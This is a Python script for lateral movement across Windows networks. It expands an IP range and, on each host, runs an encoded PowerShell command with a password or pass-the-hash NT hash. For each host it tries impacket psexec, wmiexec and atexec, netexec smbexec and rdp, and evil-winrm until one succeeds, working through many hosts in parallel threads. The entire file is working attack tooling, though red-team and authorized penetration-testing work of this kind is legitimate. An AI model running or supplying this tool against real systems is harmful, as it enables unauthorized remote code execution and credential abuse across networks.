#!/usr/bin/env python3
import subprocess
import base64
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

EXEC_TIMEOUT = 15
RDP_TIMEOUT = 45
MAX_THREADS = 10

VERBOSE = False
OUTPUT = False

# Thread-safe lock for printing
print_lock = threading.Lock()

def vprint(msg):
    if VERBOSE:
        with print_lock:
            print(msg)

def oprint(msg):
    if OUTPUT:
        with print_lock:
            print(msg)

def safe_print(msg):
    with print_lock:
        print(msg)

def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [f"{a}.{b}.{c}.{d}"
            for a in expanded[0]
            for b in expanded[1]
            for c in expanded[2]
            for d in expanded[3]]


def is_nthash(credential):
    """Check if credential is an NT hash (32 hex chars, optionally prefixed with ':')"""
    # Strip leading colon if present
    cred = credential.lstrip(':')
    cred = cred.replace("'", "")
    # Check if it's exactly 32 hex characters
    if len(cred) == 32:
        try:
            int(cred, 16)  # Verify it's valid hex
            return True
        except ValueError:
            return False
    return False


def build_cmd(tool, user, target, credential, command):
    b64 = base64.b64encode(command.encode("utf-16le")).decode()

    # check if using NTLM hash or password
    use_hash = is_nthash(credential)
    hash = credential.lstrip(':')

    if tool == "psexec":
        if use_hash:
            return f"impacket-psexec -hashes :{hash} {user}@{target} 'powershell -enc {b64}'"
        else:
            return f"impacket-psexec {user}:{credential}@{target} 'powershell -enc {b64}'"

    if tool == "wmiexec":
        if use_hash:
            return f"impacket-wmiexec -hashes :{hash} {user}@{target} 'powershell -enc {b64}'"
        else:
            return f"impacket-wmiexec {user}:{credential}@{target} 'powershell -enc {b64}'"

    if tool == "atexec":
        if use_hash:
            return f"impacket-atexec -hashes :{hash} {user}@{target} 'powershell -enc {b64}'"
        else:
            return f"impacket-atexec {user}:{credential}@{target} 'powershell -enc {b64}'"

    if tool == "smbexec":
        if use_hash:
            return f"nxc smb {target} -H {hash} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec"
        else:
            return f"nxc smb {target} -p {credential} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec"

    if tool == "winrm":
        if use_hash:
            return f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u {user} -H {hash}"
        else:
            return f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u {user} -p {credential}"
        
    if tool == "rdp":
        if use_hash:
            return f"echo 'y' | nxc rdp {target} -u {user} -H {hash} -X 'powershell -enc {b64}'"
        else:
            return f"echo 'y' | nxc rdp {target} -u {user} -p {credential} -X 'powershell -enc {b64}'"

    raise Exception(f"Unknown tool: {tool}")


def run_chain(user, ip, credential, command):
    chain = ["psexec", "winrm", "wmiexec", "atexec", "smbexec", "rdp"]
    for tool in chain:
        cmd = build_cmd(tool, user, ip, credential, command)
        safe_print(f"[i] Trying {tool}: {cmd}")

        try:
            if not tool == "rdp":
                result = subprocess.run(cmd, shell=True, timeout=EXEC_TIMEOUT, capture_output=True)
            else:
                result = subprocess.run(cmd, shell=True, timeout=RDP_TIMEOUT, capture_output=True)
            rc = result.returncode
            out = result.stdout.decode("utf-8", errors="ignore")
            vprint(f"[v] Output for {tool} on {ip} (rc={rc}):\n{out}")
        except subprocess.TimeoutExpired:
            safe_print(f"[-] For {ip}: {tool} timed out.")
            continue

        if tool == "psexec" and "[-] share 'SYSVOL' is not writable." in out:
            safe_print(f"[-] For {ip}: {tool} failed.")
            continue

        if (tool == "smbexec" or tool == "atexec") and '[-]' in out:
            safe_print(f"[-] For {ip}: {tool} failed.")
            continue

        if (tool == "smbexec" or tool == "rdp") and rc == 0 and out == "":
            safe_print(f"[-] For {ip}: {tool} failed.")
            continue

        if rc == 0 or (tool == "winrm" and rc == 1):
            safe_print(f"[+] For {ip}: {tool} succeeded.")
            oprint(out)
            return tool

        safe_print(f"[-] For {ip}: {tool} failed.")

    return None


def execute_on_ip(username, ip, credential, command):
    """Worker function to execute command on a single IP"""
    safe_print(f"[*] Attempting to execute command on {ip}...")
    tool = run_chain(username, ip, credential, command)

    if tool is None:
        safe_print(f"[!] All tools failed for {ip}.")
        return (ip, None)
    else:
        safe_print(f"[+] Command executed on {ip} using {tool}.")
        return (ip, tool)

def escape_quotes(pw):
    out = []
    current = ""

    for i, ch in enumerate(pw):
        if ch != "'":
            current += ch
        else:
            # Flush current chunk
            if current:
                out.append(f"'{current}'")
                current = ""

            # If this is the LAST character, emit literal \'
            if i == len(pw) - 1:
                out.append("\\'")
            else:
                # Middle of string apostrophe → '\'' pattern
                out.append("'\\''")

    # Flush tail chunk
    if current:
        out.append(f"'{current}'")

    return "".join(out)


def main():
    global VERBOSE
    global OUTPUT

    if len(sys.argv) < 4:
        print("Usage: exec_across_ips.py <ip_range> <username> <credential> <command> [-v] [-o]")
        print("  credential: either a password or NT hash")
        print("  -o: enable successful command output")
        print("  -v: verbose mode")
        sys.exit(1)

    # detect -v anywhere
    if "-v" in sys.argv:
        VERBOSE = True
        sys.argv.remove("-v")
    
    if "-o" in sys.argv:
        OUTPUT = True
        sys.argv.remove("-o")
    else:
        print("Run with -o to see the output of successful commands")

    ip_range = sys.argv[1]
    username = sys.argv[2]
    credential = sys.argv[3]
    command = " ".join(sys.argv[4:]) if len(sys.argv) > 4 else "whoami"

    ips = parse_ip_range(ip_range)

    # Detect auth type
    auth_type = "hash" if is_nthash(credential) else "password"
    print(f"[*] Detected credential type: {auth_type}")
    print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")

    # allow usernames/passwords with `'`
    if auth_type == "password":
        if "'" in username:
            username = escape_quotes(username)
        else:
            username = "'" + username + "'"
        if "'" in credential:
            credential = escape_quotes(credential)
        else:
            credential = "'" + credential + "'"


    vprint(f"Username: {username}")
    vprint(f"Credential: {credential}")

    # Use ThreadPoolExecutor to process IPs in parallel
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Submit all tasks
        futures = [executor.submit(execute_on_ip, username, ip, credential, command) for ip in ips]

        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                safe_print(f"[!] Exception occurred: {e}")


if __name__ == "__main__":
    main()
